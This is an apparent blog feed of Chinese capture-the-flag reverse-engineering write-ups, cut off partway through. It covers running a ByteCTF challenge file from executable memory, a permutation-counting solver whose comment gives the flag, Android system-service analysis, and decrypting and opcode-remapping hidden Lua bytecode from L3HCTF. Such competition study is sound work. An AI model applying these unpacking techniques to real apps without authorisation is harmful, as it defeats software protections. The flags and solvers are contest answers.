<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0wl’s Blog</title>
  <icon>https://www.0wl.site/icon.png</icon>
  
  <link href="https://www.0wl.site/atom.xml" rel="self"/>
  
  <link href="https://www.0wl.site/"/>
  <updated>2021-12-13T14:11:07.340Z</updated>
  <id>https://www.0wl.site/</id>
  
  <author>
    <name>0wl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ByteCTF2021决赛re writeup</title>
    <link href="https://www.0wl.site/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/"/>
    <id>https://www.0wl.site/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/</id>
    <published>2021-12-13T03:21:37.000Z</published>
    <updated>2021-12-13T14:11:07.340Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>ByteCTF 中部分逆向题的wp</p></div></article><span id="more"></span><h2 id="BabyHeaven">BabyHeaven</h2><p>​这下面是队友做的部分和写的 wp ⬇</p><p>​使用以下代码加载所给文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> mem = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x4000</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;BabyHeaven&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="built_in">fread</span>(mem, <span class="number">1</span>, <span class="number">0x3476</span>, fp);</span><br><span class="line">((<span class="built_in"><span class="keyword">void</span></span> (*)())mem)();</span><br></pre></td></tr></table></figure><p>​调试可得程序使用VirtualAlloc函数分配了一段可执行的空间，并写入了自己的汇编代码来执行，直接将其中的二进制数字用正则表达式筛选出来，需要注意的是其中顺序有颠倒，写成二进制文件，构造函数，即可得到如下算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">220</span>);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">5</span>] = <span class="number">15</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">8</span>] = <span class="number">10</span>;</span><br><span class="line">  v4[<span class="number">9</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">10</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">25</span>;</span><br><span class="line">  v4[<span class="number">12</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">13</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">14</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">15</span>] = <span class="number">16</span>;</span><br><span class="line">  v4[<span class="number">16</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">17</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">18</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">19</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">20</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">21</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">22</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">23</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">24</span>] = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">220</span>);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">18</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">23</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">12</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">25</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">20</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">19</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">15</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">13</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">10</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">7</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">22</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">8</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">3</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">16</span>;</span><br><span class="line">  v5 = <span class="number">25</span>;</span><br><span class="line">  *a1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++*a1;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v5 - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = v5 - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4[i - <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] &gt; (<span class="keyword">int</span>)result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v5 - <span class="number">1</span>; j &gt;= i &amp;&amp; v4[j] &lt;= v4[i - <span class="number">1</span>]; --j )</span><br><span class="line">      ;</span><br><span class="line">    v2 = i - <span class="number">1</span>;</span><br><span class="line">    v4[i - <span class="number">1</span>] ^= v4[j];</span><br><span class="line">    v4[j] ^= v4[v2];</span><br><span class="line">    v4[i - <span class="number">1</span>] ^= v4[j];</span><br><span class="line">    <span class="keyword">for</span> ( j = v5 - <span class="number">1</span>; i &lt; j; --j )</span><br><span class="line">    &#123;</span><br><span class="line">      v4[i] ^= v4[j];</span><br><span class="line">      v4[j] ^= v4[i];</span><br><span class="line">      v4[i++] ^= v4[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; v4[i] == v3[i]; ++i )</span><br><span class="line">      ;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; v5 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>​并通过所给文件的最后几行<img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/algo.png" class=""></p><p>​推测是上述算法的运行次数转ASCII就是flag</p><p>​求运行次数这部分是我写的脚本⬇</p><p>​通过找每一次执行的输出结果的规律，得到计算执行次数的方法</p><p>​<img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/number.png" class=""></p><p>​这一段可以看出要从序列末尾 <code>11 3 6 8 13</code> 变为 <code>13 3 6 8 11</code> 需要执行的次数是 4!，即一个数变成后面序列中比它稍大的数（只大一个），并且后面的序列为升序的次数是后面序列数字个数的阶乘</p><p>​那就可以算出从 <code>5, 18, 14, 23, 9, 1, 2, 3, 4, 6, 7, 8, 10, 11, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25</code> 变化到 <code>5, 18, 14, 23, 11, 1, 2, 3, 4, 6, 7, 8, 9, 10, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25</code> 的次数是 2*20!</p><p>​之后减去和增加剩余的部分就可以得到最终执行的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">dst = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>]</span><br><span class="line">src = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line">dst2 = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">16</span>]</span><br><span class="line">src2 = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="number">2</span>*math.factorial(<span class="number">20</span>)</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">factor = <span class="number">19</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="built_in">len</span>(src)):</span><br><span class="line">    ans+=(src.index(dst[i])-i)*math.factorial(factor)</span><br><span class="line">    factor-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(src.index(dst[i]),i,-<span class="number">1</span>):</span><br><span class="line">        src[j]=src[j-<span class="number">1</span>]</span><br><span class="line">    src[i]=dst[i]</span><br><span class="line"></span><br><span class="line">ans2 = <span class="number">0</span></span><br><span class="line">factor = <span class="number">19</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="built_in">len</span>(src2)):</span><br><span class="line">    ans2+=(src2.index(dst2[i])-i)*math.factorial(factor)</span><br><span class="line">    factor-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(src2.index(dst2[i]),i,-<span class="number">1</span>):</span><br><span class="line">        src2[j]=src2[j-<span class="number">1</span>]</span><br><span class="line">    src2[i]=dst2[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(result - ans + ans2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x27;Qw021zbG&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ByteService（未完成）">ByteService（未完成）</h2><p>​<strong>这题并没有做出来，还差最后的 java 逆向，这里先记录一下已有的进度，然后就等官方 wp 了</strong></p><p>​首先看 apk 反编译结果发现是实现了一个进程通信，反编译出来的是客户端代码，而服务端是在题目描述里下载得到的sdk</p><p>​<code>Android Studio</code> 下一个版本对应的 sdk，用从 xml 下载得到的  zip 替换已有 sdk 目录下的<code>system-images</code> 里的文件，开模拟器打开 apk 测试可以得到</p><img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/test.png" class=""><p>​输入是16个字符的时候能够得到最底下显示的内容（apk实际上没有调用 checkCTFService 函数）</p><img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/check.png" class=""><p>​<code>adb shell service list</code>可以查看开的系统服务，这里可以看到自定义了一个服务</p><img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/service.png" class=""><p>​查资料可以知道 <code>/system/framework</code> 目录下存的是 sdk 核心文件，<code>services.jar</code> 里是系统服务的代码。找到 <code>com.android.server.os.ByteCTFService</code> 可以看到 flag 的验证部分，而<code>com.bytedance.bytectf.A</code> 和 <code>android.os.IByteCTFService</code> 这两个类在 <code>framework.jar</code> 里面</p><p>​之后就是逆向的过程，使用了 java 的 lambda 函数，然后那一堆函数就看不懂了</p><h2 id="参考资料">参考资料</h2><ul><li><a href="https://blog.csdn.net/happy_horse/article/details/51733492">Android进程间通信（一）：使用Parcel对象完成进程间通信</a></li><li><a href="https://bbs.pediy.com/thread-221291.htm">android系统服务的查找</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;ByteCTF 中部分逆向题的wp&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>L3HCTF luuuuua</title>
    <link href="https://www.0wl.site/2021/11/16/L3HCTF-luuuuua/"/>
    <id>https://www.0wl.site/2021/11/16/L3HCTF-luuuuua/</id>
    <published>2021-11-16T15:02:19.000Z</published>
    <updated>2021-11-17T06:21:21.772Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>L3HCTF luuuuua 的题解，非预期警告</p></div></article><span id="more"></span><p><code>java</code> 层感觉看不出什么，直接从 <code>native</code> 层开始</p><h2 id="libluajava"><a href="#libluajava" class="headerlink" title="libluajava"></a>libluajava</h2><p>​        一个实现安卓调用 lua 的库，首先寻找加载 lua 字节码的函数 <code>lua_loadfile</code>（反编译后没有这个函数名，根据其他参考项目识别出）</p><blockquote><p>参考项目：<br>    <a href="https://github.com/jasonsantos/luajava">https://github.com/jasonsantos/luajava</a><br>    <a href="https://github.com/mkottman/AndroLua">https://github.com/mkottman/AndroLua</a><br>    <a href="https://github.com/LuaDist/luajava">https://github.com/LuaDist/luajava</a></p><p>（最后一个是题目中用到的库，但是赛时编译不出来就没用到）</p></blockquote><p>​        通过动态调试发现程序加载了 assets 目录下的 <code>logo.jpg</code>，并对其进行解密</p><img src="/2021/11/16/L3HCTF-luuuuua/decode.png" class=""><p>​        从下图的 <code>fseek</code> 可以得到开始加载的文件偏移</p><img src="/2021/11/16/L3HCTF-luuuuua/offset.png" class=""><p>​        之后就是解出 luac 文件</p><h2 id="字节码替换"><a href="#字节码替换" class="headerlink" title="字节码替换"></a>字节码替换</h2><h3 id="逆向虚拟机（分析不出来）"><a href="#逆向虚拟机（分析不出来）" class="headerlink" title="逆向虚拟机（分析不出来）"></a>逆向虚拟机（分析不出来）</h3><p>​        直接解出来的 luac 文件无法反编译，猜测又是进行了字节码的替换。从库里面能发现可能替换的顺序</p><img src="/2021/11/16/L3HCTF-luuuuua/op.png" class=""><p>​        按这样子替换还是无法正确反编译，猜测程序内部虚拟机还改了顺序，但是这个虚拟机有点复杂（主要是源码没编译出来），当时分析了半天也没分析出正确的替换顺序</p><h3 id="根据特征手动替换op（非预期）"><a href="#根据特征手动替换op（非预期）" class="headerlink" title="根据特征手动替换op（非预期）"></a>根据特征手动替换op（非预期）</h3><p>​        比较 assets 里的 test.lua 与 解密出来的 luac 中的字符串，发现两者都使用了一个 base64 模块，那么就可以根据 test.lua 编译成的字节码进行替换</p><img src="/2021/11/16/L3HCTF-luuuuua/swapop.png" class=""><p>​        光按能对照出来的替换有些函数会反编译不完全，所以还要根据反编译时的错误进行猜测（可以对着像是 tea 类加密的函数猜）</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE </span><span class="keyword">ADD</span></span><br><span class="line"><span class="keyword">LOADK </span><span class="keyword">SUB</span></span><br><span class="line"><span class="keyword">LOADKX </span><span class="keyword">MUL</span></span><br><span class="line"><span class="keyword">LOADBOOL </span>MOD</span><br><span class="line">LOADNIL POW</span><br><span class="line">GETUPVAL FORLOOP</span><br><span class="line">GETTABUP FORPREP</span><br><span class="line">GETTABLE <span class="keyword">BAND</span></span><br><span class="line"><span class="keyword">SETTABUP </span>SETTABUP</span><br><span class="line">SETUPVAL <span class="keyword">BXOR</span></span><br><span class="line"><span class="keyword">SETTABLE </span><span class="keyword">SHL</span></span><br><span class="line"><span class="keyword">NEWTABLE </span><span class="keyword">SHR</span></span><br><span class="line"><span class="keyword">SELF </span><span class="keyword">EXTRAARG</span></span><br><span class="line"><span class="keyword">ADD </span><span class="keyword">MOVE</span></span><br><span class="line"><span class="keyword">SUB </span>LOADK</span><br><span class="line"><span class="keyword">MUL </span>LEN</span><br><span class="line">MOD <span class="keyword">MOVE</span></span><br><span class="line"><span class="keyword">POW </span>CONCAT</span><br><span class="line"><span class="keyword">DIV </span><span class="keyword">JMP</span></span><br><span class="line"><span class="keyword">IDIV </span>EQ</span><br><span class="line"><span class="keyword">BAND </span>LT</span><br><span class="line"><span class="keyword">BOR </span>LE</span><br><span class="line"><span class="keyword">BXOR </span>TEST</span><br><span class="line"><span class="keyword">SHL </span>TESTSET</span><br><span class="line"><span class="keyword">SHR </span>CALL</span><br><span class="line">UNM TAILCALL</span><br><span class="line"><span class="keyword">BNOT </span>RETURN</span><br><span class="line">NOT FORLOOP</span><br><span class="line">LEN FORPREP</span><br><span class="line">CONCAT TFORCALL</span><br><span class="line"><span class="keyword">JMP </span>TFORLOOP</span><br><span class="line">EQ SETLIST</span><br><span class="line">LT <span class="keyword">CLOSURE</span></span><br><span class="line"><span class="keyword">LE </span><span class="keyword">BOR</span></span><br><span class="line"><span class="keyword">TEST </span><span class="keyword">BXOR</span></span><br><span class="line"><span class="keyword">TESTSET </span>LOADK</span><br><span class="line">CALL <span class="keyword">SHR</span></span><br><span class="line"><span class="keyword">TAILCALL </span>LOADBOOL</span><br><span class="line">RETURN LOADNIL</span><br><span class="line">FORLOOP GETUPVAL</span><br><span class="line">FORPREP GETTABUP</span><br><span class="line">TFORCALL GETTABLE</span><br><span class="line">TFORLOOP <span class="keyword">JMP</span></span><br><span class="line"><span class="keyword">SETLIST </span>EQ</span><br><span class="line"><span class="keyword">CLOSURE </span>SETTABLE</span><br><span class="line">VARARG NEWTABLE</span><br><span class="line"><span class="keyword">EXTRAARG </span>SELF</span><br><span class="line"></span><br><span class="line">粗略换一下</span><br><span class="line">用 luadec 里的 luaopswap 替换 op</span><br></pre></td></tr></table></figure><p>​        最终得到以下的反编译结果</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span 